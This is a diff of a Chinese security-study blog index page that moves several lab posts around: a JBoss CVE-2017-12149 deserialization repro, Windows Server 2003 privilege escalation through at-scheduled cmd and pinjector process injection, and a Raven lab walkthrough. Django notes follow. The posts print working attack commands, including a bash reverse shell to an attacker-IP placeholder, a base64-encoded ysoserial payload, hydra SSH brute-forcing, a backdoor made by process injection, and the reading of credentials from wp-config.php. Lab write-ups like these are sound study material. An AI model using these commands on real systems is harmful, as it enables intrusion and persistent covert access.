@@ -229,7 +229,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/漏洞复现/JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）复现/">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/内网渗透/Windows-Sever-2003-提权/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="wcute">
@@ -248,7 +248,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/12/09/漏洞复现/JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）复现/" itemprop="url">Untitled</a></h1>
+                <a class="post-title-link" href="/2018/12/09/内网渗透/Windows-Sever-2003-提权/" itemprop="url">Untitled</a></h1>
         
 
         <div class="post-meta">
@@ -300,35 +300,48 @@
       
         
           
-            <h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 <code>HttpInvoker</code>组件中的 <code>ReadOnlyAccessFilter</code>过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
-<h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><ol>
-<li>运行测试环境<blockquote>
-<p>cd /vulhub-master/jboss/CVE-2017-12149<br>docker-compose up -d</p>
-</blockquote>
-</li>
-</ol>
-<p>访问 <code>http://本机ip:8080</code>查看<code>Jboss</code>默认页面</p>
-<ol start="2">
-<li>编写反弹 shell 命令<br>使用 bash 进行反弹shell，但由于<code>Runtime.getRuntime().exec()</code>中不能使用管道符等bash需要的方法，需要用进行一次编码。</li>
-</ol>
-<p>工具：<a href="http://jackson.thuraisamy.me/runtime-exec-payloads.html" target="_blank" rel="noopener">http://jackson.thuraisamy.me/runtime-exec-payloads.html</a></p>
+            <h4 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h4><p>Administrator 提权至 System 权限</p>
+<p>测试机：Windows Sever 2003</p>
 <blockquote>
-<p>bash -i &gt;&amp; /dev/tcp/攻击机ip/监听port 0&gt;&amp;1</p>
+<p>C:\Documents and Settings\Administrator&gt;at 10:31 /interactive cmd</p>
 </blockquote>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-36d3b34c36ad29d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
-<ol start="3">
-<li><p>生成序列化数据<br>使用 <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a> 来复现生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>发送 POC<br>生成好的POC即为<code>poc.ser</code>，将这个文件作为<code>POST Body</code>发送至<code>/invoker/readonly</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-1c65c1a767013d2c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
-</li>
-<li><p>成功反弹到 <code>shell</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-2bcc431fc7f09e9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
-</li>
+<p>新加了一项作业，其作业 ID = 2 #10:31 启动cmd命令行<br><img src="https://upload-images.jianshu.io/upload_images/12585049-f59ed97eecdeb8f4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
+<p>cmd 权限变更为 system<br><img src="https://upload-images.jianshu.io/upload_images/12585049-f71183a3925a439f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
+<p>explorer.exe # 桌面进程 此时用户是Administrator</p>
+<p>结束进程后 利用 cmd 的 taskmgr 命令启动任务管理器 重新创建 explorer.exe 进程 此时用户已变更为 system</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-0d94583f275c7a89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
+<h4 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h4><p>注入进程提权：相当于开了一个后门,隐蔽性极高,不会创建新的进程,很难发现，便于进行隐蔽的监听</p>
+<p>pinjector.exe程序下载地址：<a href="https://www.tarasco.org/security/Process_Injector/index.html" target="_blank" rel="noopener">https://www.tarasco.org/security/Process_Injector/index.html</a></p>
+<p>靶机：win server2003</p>
+<p>ip：192.168.195.129</p>
+<ol>
+<li>cmd 运行 pinjector.exe 程序</li>
 </ol>
-<h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h4><ol>
-<li>不需要 http-invoker.sar 组件的用户可直接删除此组件。</li>
-<li>添加如下代码至 <code>http-invoker.sar</code> 下 <code>web.xml</code> 的 <code>security-constraint</code> 标签中，对 <code>http invoker</code> 组件进行访问控制：<code>&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</code></li>
+<blockquote>
+<p>pinjector # 参数及说明<br>pinjector -l # 列出当前执行的进程及其相应的用户名<br>pinjector -p pid cmd port # 对pid进程执行注入</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-55b01b85d32da102.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p>
+<ol start="2">
+<li>查看当前进程及用户</li>
 </ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-acf236f42d99b43d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></p>
+<p>此时1234端口未被占用</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-eb1340dac2f40258.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"></p>
+<ol start="4">
+<li>选取进程进行注入</li>
+</ol>
+<blockquote>
+<p>pinjector -p 440 cmd 1234</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-3624ca07bf1c9179.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"></p>
+<ol start="5">
+<li>再次查看1234端口发现被占用</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-00531426642a0706.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"></p>
+<ol start="6">
+<li>同时kali中可以利用nc进行监听，获取system权限</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-f51861f577ebb910.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"></p>
 
           
         
@@ -458,167 +471,6 @@
 </li>
 </ul>
 <p>参考链接：<a href="https://blog.csdn.net/m0_37438418/article/details/80289025" target="_blank" rel="noopener">https://blog.csdn.net/m0_37438418/article/details/80289025</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/内网渗透/Windows-Sever-2003-提权/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wcute">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo Test">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/12/09/内网渗透/Windows-Sever-2003-提权/" itemprop="url">Untitled</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
-                2018-12-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h4><p>Administrator 提权至 System 权限</p>
-<p>测试机：Windows Sever 2003</p>
-<blockquote>
-<p>C:\Documents and Settings\Administrator&gt;at 10:31 /interactive cmd</p>
-</blockquote>
-<p>新加了一项作业，其作业 ID = 2 #10:31 启动cmd命令行<br><img src="https://upload-images.jianshu.io/upload_images/12585049-f59ed97eecdeb8f4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
-<p>cmd 权限变更为 system<br><img src="https://upload-images.jianshu.io/upload_images/12585049-f71183a3925a439f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
-<p>explorer.exe # 桌面进程 此时用户是Administrator</p>
-<p>结束进程后 利用 cmd 的 taskmgr 命令启动任务管理器 重新创建 explorer.exe 进程 此时用户已变更为 system</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-0d94583f275c7a89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
-<h4 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h4><p>注入进程提权：相当于开了一个后门,隐蔽性极高,不会创建新的进程,很难发现，便于进行隐蔽的监听</p>
-<p>pinjector.exe程序下载地址：<a href="https://www.tarasco.org/security/Process_Injector/index.html" target="_blank" rel="noopener">https://www.tarasco.org/security/Process_Injector/index.html</a></p>
-<p>靶机：win server2003</p>
-<p>ip：192.168.195.129</p>
-<ol>
-<li>cmd 运行 pinjector.exe 程序</li>
-</ol>
-<blockquote>
-<p>pinjector # 参数及说明<br>pinjector -l # 列出当前执行的进程及其相应的用户名<br>pinjector -p pid cmd port # 对pid进程执行注入</p>
-</blockquote>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-55b01b85d32da102.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p>
-<ol start="2">
-<li>查看当前进程及用户</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-acf236f42d99b43d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></p>
-<p>此时1234端口未被占用</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-eb1340dac2f40258.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"></p>
-<ol start="4">
-<li>选取进程进行注入</li>
-</ol>
-<blockquote>
-<p>pinjector -p 440 cmd 1234</p>
-</blockquote>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-3624ca07bf1c9179.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"></p>
-<ol start="5">
-<li>再次查看1234端口发现被占用</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-00531426642a0706.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"></p>
-<ol start="6">
-<li>同时kali中可以利用nc进行监听，获取system权限</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-f51861f577ebb910.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"></p>
 
           
         
@@ -809,185 +661,6 @@ pty.spawn                 使用pty的spawn方法调用/bin/bash获取一个标�
 </li>
 </ol>
 <p><br><hr>其他的感觉不是经常使用，就没有再做笔记了</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/内网渗透/渗透测试-靶机Raven/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wcute">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo Test">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/12/09/内网渗透/渗透测试-靶机Raven/" itemprop="url">Untitled</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
-                2018-12-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>参考链接：<a href="https://www.anquanke.com/post/id/163996" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163996</a></p>
-<p>攻击机 ip：192.168.195.133<br>靶机 ip：192.168.195.139</p>
-<ol>
-<li>探测存活主机<blockquote>
-<p>root@kali:~# arp-scan -l </p>
-</blockquote>
-</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-b8ca7963f8b2df0b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<ol start="2">
-<li>端口探测（<code>nmap</code>为例）<blockquote>
-<p>root@kali:~# nmap -sV -p- 192.168.195.139</p>
-</blockquote>
-</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-beb2dacfe6a374ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<ol start="3">
-<li>使用 <code>Dirbuster</code> 工具进行敏感目录扫描</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-4eaec0f613623e7a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>其中通过访问<code>vendor</code>目录发现<code>PHPMailerAutoload.php</code>文件，查询后发现<code>CVE-2016-10033</code>是<code>PHPMailer</code>中存在的高危安全漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。<br>CVE参考链接：<a href="https://paper.seebug.org/161/" target="_blank" rel="noopener">https://paper.seebug.org/161/</a></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-3c88f4f47b440312.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>通过访问<code>service.html</code>查看源代码发现flag</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-832e8161ea9e72b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<ol start="4">
-<li>由于发现<code>wordpress</code>目录，所以使用<code>Wpscan</code>扫描<br><code>Wpscan</code>是一个扫描<code>WordPress</code>漏洞的黑盒子扫描器，可以扫描出<code>wordpress</code>的版本，主题，插件，后台用户以及爆破后台用户密码等</li>
-</ol>
-<blockquote>
-<p>root@kali:~# wpscan –url “<a href="http://192.168.195.139/wordpress&quot;" target="_blank" rel="noopener">http://192.168.195.139/wordpress&quot;</a> -e u vp<br><code>-e</code>   枚举方式<br><code>u</code>     id 为1-10的用户名<br><code>vp</code> 扫描脆弱插件</p>
-</blockquote>
-<p>探测到两个用户名，如图<br><img src="https://upload-images.jianshu.io/upload_images/12585049-e4ec913e60c5e69e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<ol start="5">
-<li>使用<code>hydra</code>对其进行<code>SSH</code>爆破<blockquote>
-<p>root@kali:~# hydra -l michael -P ‘/root/Desktop/常用密码.dict’ -V -o ssh.log 192.168.195.139 ssh</p>
-</blockquote>
-</li>
-</ol>
-<p>破解出密码：“michael”（em…我其实没破解出来）</p>
-<ol start="6">
-<li>成功登录<code>ssh</code><blockquote>
-<p>root@kali:~#ssh <a href="mailto:michael@192.168.195.139" target="_blank" rel="noopener">michael@192.168.195.139</a></p>
-</blockquote>
-</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-7839927e24636bbb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>查询到 <code>/var/www</code>目录下存放<code>flag2.txt</code></p>
-<blockquote>
-<p>michael@Raven:/var/www$ cat flag2.txt</p>
-</blockquote>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-67af668fdd262491.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>在<code>wordpress</code>的<code>wp_config.php</code>里找到<code>mysql</code>的账户密码</p>
-<blockquote>
-<p>michael@Raven:/var/www/html/wordpress$ vi wp-config.php</p>
-</blockquote>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-7ca07e6e6a781951.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<ol start="7">
-<li>上传一个大马并访问<br>通过连接<code>mysql</code>查询到<code>flag3</code> <code>flag4</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-1713571b428c5244.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-8eafc11f6696014e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<ol start="8">
-<li>提权<br>对<code>steven</code>的<code>hash</code>值进行<code>md5</code>解密得到<code>pink84</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-3b314d24ec72dead.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/12585049-a602b8f4d5fba6c5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>由<code>python -c ’import pty; pty.spawn(&quot;/bin/sh&quot;)’</code>得到一个可以交互的<code>shell</code>，在有<code>root</code>密码的前提下可以<code>su</code>,<code>steven</code>是<code>root</code>账户<br><img src="https://upload-images.jianshu.io/upload_images/12585049-52640d3d45922438.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>成功提权至<code>root</code>账户</li>
-</ol>
 
           
         
@@ -1538,6 +1211,326 @@ with request.urlopen(&apos;https://www.baidu.com&apos;) as f:
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/内网渗透/渗透测试-靶机Raven/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo Test">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/09/内网渗透/渗透测试-靶机Raven/" itemprop="url">Untitled</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
+                2018-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>参考链接：<a href="https://www.anquanke.com/post/id/163996" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163996</a></p>
+<p>攻击机 ip：192.168.195.133<br>靶机 ip：192.168.195.139</p>
+<ol>
+<li>探测存活主机<blockquote>
+<p>root@kali:~# arp-scan -l </p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-b8ca7963f8b2df0b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<ol start="2">
+<li>端口探测（<code>nmap</code>为例）<blockquote>
+<p>root@kali:~# nmap -sV -p- 192.168.195.139</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-beb2dacfe6a374ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<ol start="3">
+<li>使用 <code>Dirbuster</code> 工具进行敏感目录扫描</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-4eaec0f613623e7a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>其中通过访问<code>vendor</code>目录发现<code>PHPMailerAutoload.php</code>文件，查询后发现<code>CVE-2016-10033</code>是<code>PHPMailer</code>中存在的高危安全漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。<br>CVE参考链接：<a href="https://paper.seebug.org/161/" target="_blank" rel="noopener">https://paper.seebug.org/161/</a></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-3c88f4f47b440312.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>通过访问<code>service.html</code>查看源代码发现flag</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-832e8161ea9e72b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<ol start="4">
+<li>由于发现<code>wordpress</code>目录，所以使用<code>Wpscan</code>扫描<br><code>Wpscan</code>是一个扫描<code>WordPress</code>漏洞的黑盒子扫描器，可以扫描出<code>wordpress</code>的版本，主题，插件，后台用户以及爆破后台用户密码等</li>
+</ol>
+<blockquote>
+<p>root@kali:~# wpscan –url “<a href="http://192.168.195.139/wordpress&quot;" target="_blank" rel="noopener">http://192.168.195.139/wordpress&quot;</a> -e u vp<br><code>-e</code>   枚举方式<br><code>u</code>     id 为1-10的用户名<br><code>vp</code> 扫描脆弱插件</p>
+</blockquote>
+<p>探测到两个用户名，如图<br><img src="https://upload-images.jianshu.io/upload_images/12585049-e4ec913e60c5e69e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<ol start="5">
+<li>使用<code>hydra</code>对其进行<code>SSH</code>爆破<blockquote>
+<p>root@kali:~# hydra -l michael -P ‘/root/Desktop/常用密码.dict’ -V -o ssh.log 192.168.195.139 ssh</p>
+</blockquote>
+</li>
+</ol>
+<p>破解出密码：“michael”（em…我其实没破解出来）</p>
+<ol start="6">
+<li>成功登录<code>ssh</code><blockquote>
+<p>root@kali:~#ssh <a href="mailto:michael@192.168.195.139" target="_blank" rel="noopener">michael@192.168.195.139</a></p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-7839927e24636bbb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<p>查询到 <code>/var/www</code>目录下存放<code>flag2.txt</code></p>
+<blockquote>
+<p>michael@Raven:/var/www$ cat flag2.txt</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-67af668fdd262491.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<p>在<code>wordpress</code>的<code>wp_config.php</code>里找到<code>mysql</code>的账户密码</p>
+<blockquote>
+<p>michael@Raven:/var/www/html/wordpress$ vi wp-config.php</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-7ca07e6e6a781951.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<ol start="7">
+<li>上传一个大马并访问<br>通过连接<code>mysql</code>查询到<code>flag3</code> <code>flag4</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-1713571b428c5244.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-8eafc11f6696014e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<ol start="8">
+<li>提权<br>对<code>steven</code>的<code>hash</code>值进行<code>md5</code>解密得到<code>pink84</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-3b314d24ec72dead.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/12585049-a602b8f4d5fba6c5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>由<code>python -c ’import pty; pty.spawn(&quot;/bin/sh&quot;)’</code>得到一个可以交互的<code>shell</code>，在有<code>root</code>密码的前提下可以<code>su</code>,<code>steven</code>是<code>root</code>账户<br><img src="https://upload-images.jianshu.io/upload_images/12585049-52640d3d45922438.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>成功提权至<code>root</code>账户</li>
+</ol>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/python/Django--（admin）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo Test">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/09/python/Django--（admin）/" itemprop="url">Untitled</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
+                2018-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <ul>
+<li><p>Admin 简介</p>
+<blockquote>
+<p>Admin 是 Django 自带的一个功能强大的自动化数据管理界面<br>被授权的用户可直接在 Admin 中管理数据库<br>Django 提供许多针对 Admin 的定制功能</p>
+</blockquote>
+</li>
+<li><p>Admin 配置</p>
+<blockquote>
+<p>cmd 创建 admin 用户<br>执行 python manage.py createsuperuser<br>密码：admin123..<br>admin 入口：localhost:8000/admin/<br>默认英文界面，修改 settings.py 中的 LANGUAGE_CODE = ‘zh_Hans’ 可变更中文界面</p>
+</blockquote>
+</li>
+<li><p>配置应用</p>
+<blockquote>
+<p>在应用下 admin.py 中引入应用自身的 models 模块（或里面的模型类）<br>编辑 admin.py :<br>from django.contrib import admin<br>from models import Article<br>admin.site.register(Article)</p>
+</blockquote>
+</li>
+<li><p>修改数据默认显示名称</p>
+<blockquote>
+<p>在 models.py 的 Article 类中添加一个方法<br>python3 使用 def <strong>str</strong>(self):<br>return self.title<br>python2 使用 def <strong>unicode</strong>(self):<br>return self.title</p>
+</blockquote>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/python/Django--（Models）/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1643,6 +1636,161 @@ with request.urlopen(&apos;https://www.baidu.com&apos;) as f:
 
 <p> 显示数据<br>此时访问 <a href="http://127.0.0.1:8000/blog/" target="_blank" rel="noopener">http://127.0.0.1:8000/blog/</a> 显示id=1的 title 和 content 内容 </p>
